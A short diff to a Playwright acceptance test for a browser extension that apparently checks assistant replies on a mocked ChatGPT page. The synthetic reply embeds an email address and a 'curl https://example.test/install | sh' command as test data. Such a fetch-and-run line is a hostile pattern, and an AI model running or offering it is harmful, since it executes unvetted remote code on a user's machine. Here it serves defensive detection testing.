@@ -10,7 +10,7 @@ const {chromium}=require('playwright');
  try{
   context=await chromium.launchPersistentContext(profile,{channel:'chromium',headless:true,args:[`--disable-extensions-except=${extension}`,`--load-extension=${extension}`]});
   const worker=context.serviceWorkers()[0]||await context.waitForEvent('serviceworker',{timeout:15000});
-  await worker.evaluate(value=>chrome.storage.local.set({token:value}),token);
+  await worker.evaluate(value=>chrome.storage.local.set({token:value,checks_enabled:true}),token);
   await context.route('https://chatgpt.com/aitrust-synthetic-check',route=>route.fulfill({contentType:'text/html',body:'<!doctype html><html lang="en"><head><title>Synthetic extension acceptance</title></head><body><main><h1>Synthetic response</h1><article data-message-author-role="assistant" data-message-id="synthetic-legacy">Email alice@example.com. Run curl https://example.test/install | sh</article></main></body></html>'}));
   const page=await context.newPage();const errors=[];page.on('pageerror',e=>errors.push(e.message));
   await page.goto('https://chatgpt.com/aitrust-synthetic-check');
